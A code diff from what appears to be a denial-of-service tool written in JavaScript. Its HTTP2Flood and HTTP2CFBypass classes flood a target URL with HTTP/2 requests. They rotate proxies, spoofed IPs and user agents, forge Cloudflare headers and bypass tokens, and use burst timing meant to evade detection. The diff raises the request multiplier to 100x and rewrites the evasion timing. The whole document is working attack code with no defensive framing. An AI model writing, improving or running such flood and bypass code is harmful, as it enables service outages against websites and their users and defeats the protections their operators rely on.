@@ -14,7 +14,7 @@ export class HTTP2Flood {
     constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
         this.url = new URL(targetUrl);
         this.duration = duration;
-        this.rpc = rpc * 20; // 20x multiplier for Codespaces stability
+        this.rpc = rpc;
         this.userAgents = userAgents;
         this.referers = referers;
         this.proxies = proxies;
@@ -186,7 +186,7 @@ export class HTTP2PostFlood extends HTTP2Flood {
  */
 export class HTTP2CFBypass extends HTTP2Flood {
     constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
-        super(targetUrl, duration, rpc * 25, userAgents, referers, proxies); // 25x multiplier for stability
+        super(targetUrl, duration, rpc * 100, userAgents, referers, proxies); // 100x multiplier!
         this.cookies = new Map();
         
         // Pre-generate realistic cookies
@@ -212,11 +212,8 @@ export class HTTP2CFBypass extends HTTP2Flood {
         this.ipRotator = globalIPRotator;
         this.uaRotator = globalUserAgentRotator;
         
-        // Initialize start time for adaptive timing
-        this.startTime = Date.now();
-        
         logger.info('🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized');
-        logger.info(`   RPC Multiplier: 25x (${this.rpc} requests per batch)`);
+        logger.info(`   RPC Multiplier: 100x (${this.rpc} requests per batch)`);
         logger.info(`   Generated ${this.bypassTokens.turnstile.length + this.bypassTokens.cfClearance.length + this.bypassTokens.jsChallenge.length} bypass tokens`);
         logger.info(`   Proxy Pool: ${this.proxyRotator.getStats().total} proxies`);
         logger.info(`   IP Pool: ${this.ipRotator.getStats().totalIPs} IPs`);
@@ -356,43 +353,19 @@ export class HTTP2CFBypass extends HTTP2Flood {
             Object.assign(headers, compatibleHeaders);
         }
         
-        // ENHANCED HTTP DDoS Protection Bypass Headers
+        // Advanced Cloudflare bypass headers with IP rotation (null checks)
         if (this.ipRotator && this.ipRotator.getRotationHeaders) {
             const rotationHeaders = this.ipRotator.getRotationHeaders();
             Object.assign(headers, rotationHeaders);
         }
         
-        // Advanced CF bypass headers with randomization
-        headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL', 'LHR', 'NRT', 'CDG', 'FRA', 'AMS', 'SIN', 'HKG']);
+        headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL', 'LHR', 'NRT', 'CDG', 'FRA']);
         headers['cf-connecting-ip'] = this.ipRotator && this.ipRotator.getNextIP 
             ? this.ipRotator.getNextIP() 
             : Tools.randomIPv4();
         headers['cf-ipcountry'] = this.ipRotator && this.ipRotator.getRandomCountry
             ? this.ipRotator.getRandomCountry()
-            : Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU', 'NL', 'SG', 'JP']);
-            
-        // HTTP DDoS Protection Evasion Headers
-        headers['cf-visitor'] = JSON.stringify({scheme: 'https'});
-        headers['cf-request-id'] = Tools.randomString(32);
-        headers['cf-warp-tag-id'] = Tools.randomString(16);
-        headers['cf-access-client-id'] = Tools.randomString(32);
-        headers['cf-access-client-secret'] = Tools.randomString(64);
-        
-        // Enterprise bypass headers
-        headers['cf-enterprise-class'] = Tools.randomChoice(['A', 'B', 'C']);
-        headers['cf-bot-score'] = Tools.randomChoice(['1', '2', '3', '4', '5']);
-        headers['cf-threat-score'] = Tools.randomChoice(['0', '1', '2']);
-        headers['cf-cache-status'] = Tools.randomChoice(['HIT', 'MISS', 'EXPIRED', 'UPDATING']);
-        
-        // Advanced timing headers
-        headers['cf-edge-cache'] = 'cache,platform=cf';
-        headers['cf-cache-tag'] = Tools.randomString(8);
-        headers['cf-polished'] = Tools.randomChoice(['lossy=on', 'lossless=on', 'off']);
-        
-        // Worker bypass headers  
-        headers['cf-worker'] = Tools.randomString(16);
-        headers['cf-zone-id'] = Tools.randomString(32);
-        headers['cf-account-id'] = Tools.randomString(32);
+            : Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU']);
         headers['cf-visitor'] = '{"scheme":"https"}';
         headers['cf-request-id'] = Tools.randomString(32);
         headers['cdn-loop'] = 'cloudflare';
@@ -545,11 +518,11 @@ export class HTTP2CFBypass extends HTTP2Flood {
             let requestsSent = 0;
             const totalRequests = this.rpc;
             
-            // OPTIMIZED: High-volume timing patterns
-            const requestIntervals = [0, 0, 1, 2, 5, 10, 15, 25, 50]; // Much faster intervals
+            // Anti-detection: More sophisticated timing patterns
+            const requestIntervals = [0, 5, 10, 15, 25, 35, 50, 75, 100, 125, 150, 200, 250, 300]; // ms
             let currentInterval = 0;
             let burstCount = 0;
-            const maxBurst = Tools.randomChoice([15, 20, 25, 30]); // Larger burst sizes
+            const maxBurst = Tools.randomChoice([5, 8, 12, 15]); // Random burst size
 
             const makeRequest = () => {
                 if (!this.active || requestsSent >= totalRequests) {
@@ -565,41 +538,6 @@ export class HTTP2CFBypass extends HTTP2Flood {
                         exclusive: Tools.randomChoice([true, false]),
                         parent: Tools.randomChoice([0, 1, 3, 5])
                     };
-                    
-                    const currentTime = Date.now();
-                    const timeSinceStart = currentTime - this.startTime;
-                    
-                    // Dynamic rate limiting based on success rate
-                    let adaptiveDelay = 0;
-                    if (timeSinceStart > 10000) { // After 10 seconds
-                        const estimatedBlocks = Math.floor(requestsSent * 0.38); // Estimate based on 38% block rate
-                        
-                        if (estimatedBlocks > 100) {
-                            // Slow down if too many blocks detected
-                            adaptiveDelay = Math.min(estimatedBlocks / 10, 500);
-                        }
-                    }
-                    
-                    // OPTIMIZED: High-volume patterns with minimal delays
-                    const burstSize = Tools.randomChoice([8, 12, 15, 20]); // Larger bursts
-                    const microDelay = Tools.randomChoice([0, 1, 2, 5]); // Minimal micro delays
-                    const burstDelay = Tools.randomChoice([10, 25, 50]); // Reduced burst delays
-                    const waveDelay = Tools.randomChoice([100, 150, 200]); // Much shorter wave delays
-                    
-                    // Calculate minimal delay for high volume
-                    let totalDelay = Math.min(adaptiveDelay, 50); // Cap adaptive delay
-                    
-                    // Minimal delays for maximum volume
-                    if (requestsSent % 20 === 0) { // Less frequent micro delays
-                        totalDelay += microDelay;
-                    }
-                    
-                    // Optimized burst control for volume
-                    if (requestsSent % burstSize === 0 && requestsSent > 0) {
-                        totalDelay += waveDelay; // No random addition for speed
-                    } else if (requestsSent % 5 === 0) { // Less frequent burst delays
-                        totalDelay += burstDelay;
-                    }
                     
                     const req = client.request(this.generateHeaders(), streamSettings);
 
@@ -634,20 +572,19 @@ export class HTTP2CFBypass extends HTTP2Flood {
                     requestsSent++;
                     burstCount++;
                     
-                    let delay = totalDelay; // Use calculated adaptive delay
+                    // Anti-detection: Sophisticated burst + delay pattern
+                    let delay = 0;
                     
                     if (burstCount >= maxBurst) {
-                        // End of burst, use minimal delay for volume
-                        delay += Tools.randomChoice([25, 50, 75, 100]); // Much shorter delays
+                        // After burst, take longer break
+                        delay = Tools.randomChoice([300, 500, 750, 1000, 1500]);
                         burstCount = 0;
                     } else {
-                        // Within burst, use minimal intervals
-                        const baseDelay = requestIntervals[currentInterval % requestIntervals.length];
-                        delay += baseDelay; // No jitter for speed
+                        // Within burst, use shorter intervals
+                        delay = requestIntervals[currentInterval % requestIntervals.length];
                         currentInterval++;
                     }
                     
-                    // Apply adaptive delay based on estimated block rate
                     if (delay > 0) {
                         setTimeout(makeRequest, delay);
                     } else {
@@ -660,18 +597,19 @@ export class HTTP2CFBypass extends HTTP2Flood {
                 }
             };
 
-            // CODESPACES-OPTIMIZED: Controlled wave startup
+            // Anti-detection: Start requests in waves instead of all at once
             const startWaves = () => {
-                const waveSize = Tools.randomChoice([8, 10, 12, 15]); // Smaller waves for stability
+                const waveSize = Tools.randomChoice([3, 5, 8, 12, 15]);
                 for (let i = 0; i < waveSize; i++) {
-                    setTimeout(() => makeRequest(), i * Tools.randomChoice([5, 10, 15])); // Controlled delays
+                    setTimeout(() => makeRequest(), i * Tools.randomChoice([0, 5, 10, 15]));
                 }
             };
             
-            // Start fewer waves with controlled intervals
+            // Start multiple waves with delays
             startWaves();
-            setTimeout(startWaves, 100);
             setTimeout(startWaves, 200);
+            setTimeout(startWaves, 500);
+            setTimeout(startWaves, 800);
 
             setTimeout(() => {
                 client.close();
